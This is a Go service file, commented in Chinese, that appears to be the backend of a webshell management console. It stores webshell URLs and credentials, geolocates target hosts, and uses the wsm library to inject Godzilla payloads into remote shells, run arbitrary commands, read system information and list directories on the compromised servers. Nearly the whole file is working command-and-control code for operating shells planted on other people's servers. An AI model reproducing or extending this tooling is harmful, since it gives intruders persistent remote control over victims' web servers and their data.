package services

import (
	"encoding/json"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"

	"ctg-api/database"
	"ctg-api/models"
	"ctg-api/utils"

	"github.com/xiecat/wsm"
	"github.com/xiecat/wsm/lib/charset"
	"github.com/xiecat/wsm/lib/shell"
	"github.com/xiecat/wsm/lib/shell/godzilla"
)

// WebShellService WebShell服务
type WebShellService struct{}

// NewWebShellService 创建WebShell服务实例
func NewWebShellService() *WebShellService {
	return &WebShellService{}
}

// GetWebShellList 获取WebShell列表
func (s *WebShellService) GetWebShellList() ([]models.WebShell, error) {
	return database.GetWebShellList()
}

// GetWebShellByID 根据ID获取WebShell
func (s *WebShellService) GetWebShellByID(id int) (*models.WebShell, error) {
	return database.GetWebShellByID(id)
}

// CreateWebShell 创建WebShell
func (s *WebShellService) CreateWebShell(webshell *models.WebShell) error {
	// 检查URL是否已存在（去重）
	exists, err := s.IsURLExists(webshell.URL)
	if err != nil {
		return fmt.Errorf("检查URL重复失败: %v", err)
	}
	if exists {
		return fmt.Errorf("URL已存在: %s", webshell.URL)
	}

	// 设置默认值
	now := time.Now()
	webshell.CreatedAt = now
	webshell.UpdatedAt = now

	// 设置默认状态
	if webshell.Status == "" {
		webshell.Status = models.StatusEnabled // 默认开启
	}

	// 自动获取IP地址和Location信息
	if webshell.URL != "" {
		externalIP, location, err := utils.GetLocationFromURL(webshell.URL)
		if err == nil {
			webshell.ExternalIP = externalIP
			webshell.Location = location
		} else {
			// 如果获取失败，记录日志但不影响创建
			fmt.Printf("获取IP地址和Location信息失败: %v\n", err)
		}
	}

	return database.CreateWebShell(webshell)
}

// IsURLExists 检查URL是否已存在
func (s *WebShellService) IsURLExists(url string) (bool, error) {
	webshells, err := database.GetWebShellList()
	if err != nil {
		return false, err
	}

	for _, ws := range webshells {
		if ws.URL == url {
			return true, nil
		}
	}
	return false, nil
}

// UpdateWebShell 更新WebShell
func (s *WebShellService) UpdateWebShell(webshell *models.WebShell) error {
	webshell.UpdatedAt = time.Now()

	// 智能判断是否需要更新IP地址和Location信息
	// 只有在URL发生变化时才触发IP探测
	if webshell.URL != "" && s.shouldUpdateLocation(webshell) {
		externalIP, location, err := utils.GetLocationFromURL(webshell.URL)
		if err == nil {
			webshell.ExternalIP = externalIP
			webshell.Location = location
		} else {
			// 如果获取失败，记录日志但不影响更新
			fmt.Printf("更新IP地址和Location信息失败: %v\n", err)
		}
	}

	return database.UpdateWebShell(webshell)
}

// shouldUpdateLocation 判断是否需要更新Location信息
func (s *WebShellService) shouldUpdateLocation(webshell *models.WebShell) bool {
	// 如果ExternalIP或Location为空，需要更新
	if webshell.ExternalIP == "" || webshell.Location == "" {
		return true
	}

	// 从URL中提取主机名
	parsedURL, err := url.Parse(webshell.URL)
	if err != nil {
		return false
	}

	host := parsedURL.Hostname()
	if host == "" {
		return false
	}

	// 检查是否为IP地址
	if net.ParseIP(host) != nil {
		// 如果是IP地址，检查是否与当前ExternalIP一致
		return host != webshell.ExternalIP
	}

	// 如果是域名，需要重新解析以获取最新的IP地址
	// 因为域名的IP地址可能会变化
	return true
}

// DeleteWebShell 删除WebShell
func (s *WebShellService) DeleteWebShell(id int) error {
	return database.DeleteWebShell(id)
}

// TestConnection 测试WebShell连接
func (s *WebShellService) TestConnection(id int) (map[string]interface{}, error) {
	webshell, err := database.GetWebShellByID(id)
	if err != nil {
		return nil, fmt.Errorf("WebShell不存在: %v", err)
	}

	// 检查WebShell状态
	if !webshell.IsEnabled() {
		return nil, fmt.Errorf("WebShell未启用，无法测试连接")
	}

	startTime := time.Now()

	// 根据WebShell类型测试连接
	var testResult map[string]interface{}
	var testErr error

	switch webshell.WebShellType {
	case models.WebShellTypeGodzilla:
		testResult, testErr = s.testGodzillaConnection(webshell)
	case models.WebShellTypeBehinder:
		testResult, testErr = s.testBehinderConnection(webshell)
	default:
		return nil, fmt.Errorf("不支持的WebShell类型: %s", webshell.WebShellType)
	}

	testTime := time.Since(startTime).Seconds()

	if testErr != nil {
		// 测试失败，更新状态
		webshell.Status = models.StatusDisconnected
		webshell.UpdatedAt = time.Now()
		database.UpdateWebShell(webshell)

		return map[string]interface{}{
			"id":       webshell.Id,
			"name":     webshell.Name,
			"url":      webshell.URL,
			"status":   "连接失败",
			"message":  testErr.Error(),
			"testTime": testTime,
		}, nil
	}

	// 测试成功，更新状态
	webshell.Status = models.StatusConnected
	webshell.LastConnectTime = time.Now()
	if webshell.FirstConnectTime.IsZero() {
		webshell.FirstConnectTime = time.Now()
	}
	webshell.UpdatedAt = time.Now()
	database.UpdateWebShell(webshell)

	return testResult, nil
}

// GetBasicInfo 获取WebShell基础信息
func (s *WebShellService) GetBasicInfo(id int) (map[string]interface{}, error) {
	webshell, err := database.GetWebShellByID(id)
	if err != nil {
		return nil, fmt.Errorf("WebShell不存在: %v", err)
	}

	// 检查WebShell状态
	if !webshell.IsEnabled() {
		return nil, fmt.Errorf("WebShell未启用，无法获取基础信息")
	}

	startTime := time.Now()

	// 根据WebShell类型获取基础信息
	var basicInfo map[string]interface{}
	var infoErr error

	switch webshell.WebShellType {
	case models.WebShellTypeGodzilla:
		basicInfo, infoErr = s.getGodzillaBasicInfo(webshell)
	case models.WebShellTypeBehinder:
		basicInfo, infoErr = s.getBehinderBasicInfo(webshell)
	default:
		return nil, fmt.Errorf("不支持的WebShell类型: %s", webshell.WebShellType)
	}

	infoTime := time.Since(startTime).Seconds()

	if infoErr != nil {
		return map[string]interface{}{
			"id":       webshell.Id,
			"name":     webshell.Name,
			"url":      webshell.URL,
			"status":   "获取信息失败",
			"message":  infoErr.Error(),
			"infoTime": infoTime,
		}, nil
	}

	// 添加基本信息 TODO
	basicInfo["id"] = webshell.Id
	basicInfo["name"] = webshell.Name
	basicInfo["url"] = webshell.URL
	basicInfo["status"] = "获取信息成功"
	basicInfo["message"] = "基础信息获取完成"
	basicInfo["infoTime"] = infoTime

	return basicInfo, nil
}

// testGodzillaConnection 测试Godzilla类型的WebShell连接
func (s *WebShellService) testGodzillaConnection(webshell *models.WebShell) (map[string]interface{}, error) {
	// 创建Godzilla信息
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      webshell.URL,
			Password: webshell.Pass,
			Script:   s.convertScriptType(webshell.ScriptType),
		},
		Key:      webshell.Key,
		Crypto:   s.convertCryptoType(webshell.Crypto),
		Encoding: s.convertEncodingType(webshell.Encoding),
	}

	// 创建Godzilla实例
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		return nil, fmt.Errorf("创建Godzilla实例失败: %v", err)
	}

	// 注入payload
	err = g.InjectPayload()
	if err != nil {
		return nil, fmt.Errorf("注入payload失败: %v", err)
	}

	// 使用Ping来探活
	isAlive, err := g.Ping()
	if err != nil && !isAlive {
		return nil, fmt.Errorf("连接测试失败: %v", err)
	}

	return map[string]interface{}{
		"id":        webshell.Id,
		"name":      webshell.Name,
		"url":       webshell.URL,
		"status":    "连接成功",
		"message":   "连接测试通过",
		"testTime":  0.0, // 将在调用方设置
		"output":    "",
		"rawResult": nil,
	}, nil
}

// testBehinderConnection 测试Behinder类型的WebShell连接
func (s *WebShellService) testBehinderConnection(webshell *models.WebShell) (map[string]interface{}, error) {
	// TODO: 实现Behinder连接测试
	// 这里需要根据Behinder的API实现
	return nil, fmt.Errorf("Behinder连接测试功能待实现")
}

// GetWebShellStats 获取WebShell统计信息
func (s *WebShellService) GetWebShellStats() (map[string]interface{}, error) {
	webshells, err := database.GetWebShellList()
	if err != nil {
		return nil, err
	}

	stats := map[string]interface{}{
		"total":        len(webshells),
		"enabled":      0,
		"connected":    0,
		"disconnected": 0,
		"byType":       make(map[string]int),
		"byScriptType": make(map[string]int),
	}

	for _, ws := range webshells {
		// 统计状态
		switch ws.Status {
		case models.StatusEnabled:
			stats["enabled"] = stats["enabled"].(int) + 1
		case models.StatusConnected:
			stats["connected"] = stats["connected"].(int) + 1
		case models.StatusDisconnected:
			stats["disconnected"] = stats["disconnected"].(int) + 1
		}

		// 统计WebShell类型
		webshellTypeStr := string(ws.WebShellType)
		if count, exists := stats["byType"].(map[string]int)[webshellTypeStr]; exists {
			stats["byType"].(map[string]int)[webshellTypeStr] = count + 1
		} else {
			stats["byType"].(map[string]int)[webshellTypeStr] = 1
		}

		// 统计脚本类型
		scriptTypeStr := string(ws.ScriptType)
		if count, exists := stats["byScriptType"].(map[string]int)[scriptTypeStr]; exists {
			stats["byScriptType"].(map[string]int)[scriptTypeStr] = count + 1
		} else {
			stats["byScriptType"].(map[string]int)[scriptTypeStr] = 1
		}
	}

	return stats, nil
}

// GetCommandHistory 获取WebShell命令历史记录
func (s *WebShellService) GetCommandHistory(webshellID, limit, offset int) ([]map[string]interface{}, error) {
	// TODO: 实现从数据库获取命令历史记录
	// 这里需要创建CommandHistory模型和相关的数据库操作

	// 临时返回模拟数据
	history := []map[string]interface{}{
		{
			"id":            1,
			"webshellID":    webshellID,
			"command":       "ls -la",
			"output":        "total 1234\ndrwxr-xr-x 2 user user 4096 Jan 1 00:00 .\ndrwxr-xr-x 3 user user 4096 Jan 1 00:00 ..",
			"exitCode":      0,
			"executedAt":    time.Now().Add(-time.Hour),
			"executionTime": 0.5,
		},
		{
			"id":            2,
			"webshellID":    webshellID,
			"command":       "pwd",
			"output":        "/home/user",
			"exitCode":      0,
			"executedAt":    time.Now().Add(-2 * time.Hour),
			"executionTime": 0.1,
		},
	}

	return history, nil
}

// ExecuteCommand 执行WebShell命令
func (s *WebShellService) ExecuteCommand(webshellID int, command string, timeout int) (map[string]interface{}, error) {
	// 获取WebShell信息
	webshell, err := database.GetWebShellByID(webshellID)
	if err != nil {
		return nil, fmt.Errorf("WebShell不存在: %v", err)
	}

	// 检查WebShell状态
	// if !webshell.IsEnabled() {
	// 	return nil, fmt.Errorf("WebShell未启用，无法执行命令")
	// }

	startTime := time.Now()

	// 根据WebShell类型执行命令
	var result map[string]interface{}
	var execErr error

	switch webshell.WebShellType {
	case models.WebShellTypeGodzilla:
		result, execErr = s.executeGodzillaCommand(webshell, command)
	case models.WebShellTypeBehinder:
		result, execErr = s.executeBehinderCommand(webshell, command)
	default:
		return nil, fmt.Errorf("不支持的WebShell类型: %s", webshell.WebShellType)
	}

	executionTime := time.Since(startTime).Seconds()

	if execErr != nil {
		return map[string]interface{}{
			"id":            webshellID,
			"name":          webshell.Name,
			"command":       command,
			"output":        "",
			"exitCode":      -1,
			"executedAt":    time.Now(),
			"executionTime": executionTime,
			"status":        "执行失败",
			"message":       execErr.Error(),
		}, nil
	}

	// 更新最后连接时间
	webshell.LastConnectTime = time.Now()
	webshell.Status = models.StatusConnected
	database.UpdateWebShell(webshell)

	return result, nil
}

// executeGodzillaCommand 执行Godzilla类型的WebShell命令
func (s *WebShellService) executeGodzillaCommand(webshell *models.WebShell, command string) (map[string]interface{}, error) {
	// 创建Godzilla信息
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      webshell.URL,
			Password: webshell.Pass,
			Script:   s.convertScriptType(webshell.ScriptType),
		},
		Key:      webshell.Key,
		Crypto:   s.convertCryptoType(webshell.Crypto),
		Encoding: s.convertEncodingType(webshell.Encoding),
	}
	fmt.Println("Encoding: ", s.convertEncodingType(webshell.Encoding))
	// 创建Godzilla实例
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		return nil, fmt.Errorf("创建Godzilla实例失败: %v", err)
	}

	// 注入payload
	err = g.InjectPayload()
	if err != nil {
		return nil, fmt.Errorf("注入payload失败: %v", err)
	}

	// 创建执行参数
	cp := &godzilla.ExecParams{
		Command: command,
	}

	// 执行命令
	echo, err := g.CommandExec(cp)
	if err != nil {
		return nil, fmt.Errorf("命令执行失败: %v", err)
	}

	// 解析结果
	m := echo.ToMap()
	output := ""
	if value, exists := m["raw"]; exists {
		output = fmt.Sprintf("%v", value)
	}

	return map[string]interface{}{
		"id":            webshell.Id,
		"name":          webshell.Name,
		"command":       command,
		"output":        output,
		"exitCode":      0,
		"executedAt":    time.Now(),
		"executionTime": 0.0, // 将在调用方设置
		"status":        "执行成功",
		"message":       "命令执行完成",
		"rawResult":     m,
	}, nil
}

// executeBehinderCommand 执行Behinder类型的WebShell命令
func (s *WebShellService) executeBehinderCommand(webshell *models.WebShell, command string) (map[string]interface{}, error) {
	// TODO: 实现Behinder命令执行
	// 这里需要根据Behinder的API实现
	return nil, fmt.Errorf("Behinder命令执行功能待实现")
}

// convertScriptType 转换脚本类型
func (s *WebShellService) convertScriptType(scriptType models.ScriptTypeEnum) shell.ScriptType {
	switch scriptType {
	case models.ScriptTypeJSP:
		return shell.JavaScript
	case models.ScriptTypeJSPX:
		return shell.JspxScript
	case models.ScriptTypePHP:
		return shell.PhpScript
	case models.ScriptTypeASPX:
		return shell.CsharpScript
	case models.ScriptTypeASP:
		return shell.AspScript
	default:
		return shell.JavaScript // 默认使用JSP
	}
}

// convertCryptoType 转换加密类型
func (s *WebShellService) convertCryptoType(cryptoType models.CryptoTypeEnum) godzilla.CrypticType {
	switch cryptoType {
	case models.CryptoTypeJavaAESBase64:
		return godzilla.JAVA_AES_BASE64
	case models.CryptoTypeJavaAESRaw:
		return godzilla.JAVA_AES_RAW
	case models.CryptoTypeCSharpAESBase64:
		return godzilla.CSHARP_AES_BASE64
	case models.CryptoTypeCSharpAESRaw:
		return godzilla.CSHARP_AES_RAW
	case models.CryptoTypePHPXorBase64:
		return godzilla.PHP_XOR_BASE64
	case models.CryptoTypePHPXorRaw:
		return godzilla.PHP_XOR_RAW
	case models.CryptoTypeASPXorBase64:
		return godzilla.ASP_XOR_BASE64
	case models.CryptoTypeASPXorRaw:
		return godzilla.ASP_XOR_RAW
	default:
		return godzilla.JAVA_AES_BASE64 // 默认使用JAVA_AES_BASE64
	}
}

// convertEncodingType 转换编码类型
func (s *WebShellService) convertEncodingType(encodingType models.EncodingTypeEnum) string {
	switch encodingType {
	case models.EncodingTypeUTF8:
		return charset.UTF8CharSet
	case models.EncodingTypeGBK:
		return charset.GBKCharSet
	case models.EncodingTypeGB2312:
		return charset.GB2312CharSet
	case models.EncodingTypeBIG5:
		return charset.BIG5CharSet
	case models.EncodingTypeGB18030:
		return charset.GB18030CharSet
	case models.EncodingTypeISO88591:
		return charset.ISO88591CharSet
	case models.EncodingTypeLatin1:
		return charset.Latin1CharSet
	case models.EncodingTypeUTF16:
		return charset.UTF16CharSet
	case models.EncodingTypeASCII:
		return charset.AsciiCharSet
	case models.EncodingTypeCP850:
		return charset.Cp850CharSet
	default:
		return charset.UTF8CharSet // 默认使用UTF-8
	}
}

// getGodzillaBasicInfo 获取Godzilla类型的WebShell基础信息
func (s *WebShellService) getGodzillaBasicInfo(webshell *models.WebShell) (map[string]interface{}, error) {
	// 创建Godzilla信息
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      webshell.URL,
			Password: webshell.Pass,
			Script:   s.convertScriptType(webshell.ScriptType),
		},
		Key:      webshell.Key,
		Crypto:   s.convertCryptoType(webshell.Crypto),
		Encoding: s.convertEncodingType(webshell.Encoding),
	}

	// 创建Godzilla实例
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		return nil, fmt.Errorf("创建Godzilla实例失败: %v", err)
	}

	// 注入payload
	err = g.InjectPayload()
	if err != nil {
		return nil, fmt.Errorf("注入payload失败: %v", err)
	}

	basic, err := g.BasicInfo()
	if err != nil {
		return nil, fmt.Errorf("获取基础信息失败: %v", err)
	}
	basicInfo := basic.ToMap()
	fmt.Println(basicInfo)
	// fmt.Println(basicInfo["os.name"])
	// fmt.Println(basicInfo["os.arch"])
	// fmt.Println(basicInfo["CurrentUser"]) PHP 和 JSP 还不一样
	// fmt.Println(basicInfo["OsInfo"])

	// 将 map[string]string 转换为 map[string]interface{}
	result := make(map[string]interface{})
	for k, v := range basicInfo {
		result[k] = v
	}

	return result, nil
}

// getBehinderBasicInfo 获取Behinder类型的WebShell基础信息
func (s *WebShellService) getBehinderBasicInfo(webshell *models.WebShell) (map[string]interface{}, error) {
	// TODO: 实现Behinder基础信息获取
	// 这里需要根据Behinder的API实现
	return map[string]interface{}{
		"systemInfo":       "Behinder基础信息获取功能待实现",
		"currentDirectory": "Behinder基础信息获取功能待实现",
		"diskInfo":         "Behinder基础信息获取功能待实现",
	}, nil
}

// GetFileList 获取WebShell文件列表
func (s *WebShellService) GetFileList(webshellID int, dirPath string) ([]map[string]interface{}, error) {
	fmt.Printf("GetFileList: 开始处理请求 - WebShell ID: %d, 路径: %s\n", webshellID, dirPath)

	// 获取WebShell信息
	webshell, err := database.GetWebShellByID(webshellID)
	if err != nil {
		fmt.Printf("GetFileList: WebShell不存在 - ID: %d, 错误: %v\n", webshellID, err)
		return nil, fmt.Errorf("WebShell不存在: %v", err)
	}

	fmt.Printf("GetFileList: 找到WebShell - 名称: %s, 类型: %s, 状态: %s\n", webshell.Name, webshell.WebShellType, webshell.Status)

	// 检查WebShell状态
	if !webshell.IsEnabled() {
		fmt.Printf("GetFileList: WebShell未启用 - ID: %d\n", webshellID)
		return nil, fmt.Errorf("WebShell未启用，无法获取文件列表")
	}

	// 根据WebShell类型获取文件列表
	var fileList []map[string]interface{}
	var listErr error

	fmt.Printf("GetFileList: 开始获取文件列表 - 类型: %s\n", webshell.WebShellType)

	switch webshell.WebShellType {
	case models.WebShellTypeGodzilla:
		fileList, listErr = s.getGodzillaFileList(webshell, dirPath)
	case models.WebShellTypeBehinder:
		fileList, listErr = s.getBehinderFileList(webshell, dirPath)
	default:
		fmt.Printf("GetFileList: 不支持的WebShell类型: %s\n", webshell.WebShellType)
		return nil, fmt.Errorf("不支持的WebShell类型: %s", webshell.WebShellType)
	}

	if listErr != nil {
		fmt.Printf("GetFileList: 获取文件列表失败: %v\n", listErr)
		return nil, fmt.Errorf("获取文件列表失败: %v", listErr)
	}

	fmt.Printf("GetFileList: 成功获取文件列表 - 数量: %d\n", len(fileList))

	// 更新最后连接时间
	webshell.LastConnectTime = time.Now()
	webshell.Status = models.StatusConnected
	database.UpdateWebShell(webshell)

	return fileList, nil
}

// getGodzillaFileList 获取Godzilla类型的WebShell文件列表
func (s *WebShellService) getGodzillaFileList(webshell *models.WebShell, dirPath string) ([]map[string]interface{}, error) {
	// 创建Godzilla信息
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      webshell.URL,
			Password: webshell.Pass,
			Script:   s.convertScriptType(webshell.ScriptType),
		},
		Key:      webshell.Key,
		Crypto:   s.convertCryptoType(webshell.Crypto),
		Encoding: s.convertEncodingType(webshell.Encoding),
	}

	// 创建Godzilla实例
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		return nil, fmt.Errorf("创建Godzilla实例失败: %v", err)
	}

	// 注入payload
	err = g.InjectPayload()
	if err != nil {
		return nil, fmt.Errorf("注入payload失败: %v", err)
	}

	// 创建文件列表获取参数
	gf := &godzilla.GetFiles{DirName: dirPath}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		return nil, fmt.Errorf("获取文件列表失败: %v", err)
	}

	// 解析响应
	responseMap := getFile.ToMap()
	fileListStr, exists := responseMap["fileList"]
	if !exists {
		return nil, fmt.Errorf("响应中未找到fileList字段")
	}

	// 解析文件列表字符串
	fileListStrValue := fmt.Sprintf("%v", fileListStr)
	if fileListStrValue == "" {
		return []map[string]interface{}{}, nil
	}

	// 处理文件列表字符串格式
	jsonArrayStr := "[" + strings.ReplaceAll(fileListStrValue, " , ", ",") + "]"

	// 定义文件信息结构
	type FileInfo struct {
		Name         string `json:"name"`
		LastModified string `json:"lastModified"`
		FileType     string `json:"type"`
		FileSize     string `json:"size"`
		Perm         string `json:"perm"`
	}

	var fileInfoList []FileInfo
	err = json.Unmarshal([]byte(jsonArrayStr), &fileInfoList)
	if err != nil {
		return nil, fmt.Errorf("解析文件列表失败: %v", err)
	}

	// 转换为前端需要的格式
	var result []map[string]interface{}
	for _, file := range fileInfoList {
		fileItem := map[string]interface{}{
			"name":         file.Name,
			"type":         file.FileType,
			"size":         file.FileSize,
			"lastModified": file.LastModified,
			"permissions":  file.Perm,
			"isDirectory":  file.FileType == "dir",
		}
		result = append(result, fileItem)
	}

	return result, nil
}

// getBehinderFileList 获取Behinder类型的WebShell文件列表
func (s *WebShellService) getBehinderFileList(webshell *models.WebShell, dirPath string) ([]map[string]interface{}, error) {
	// TODO: 实现Behinder文件列表获取
	// 这里需要根据Behinder的API实现
	return nil, fmt.Errorf("Behinder文件列表获取功能待实现")
}
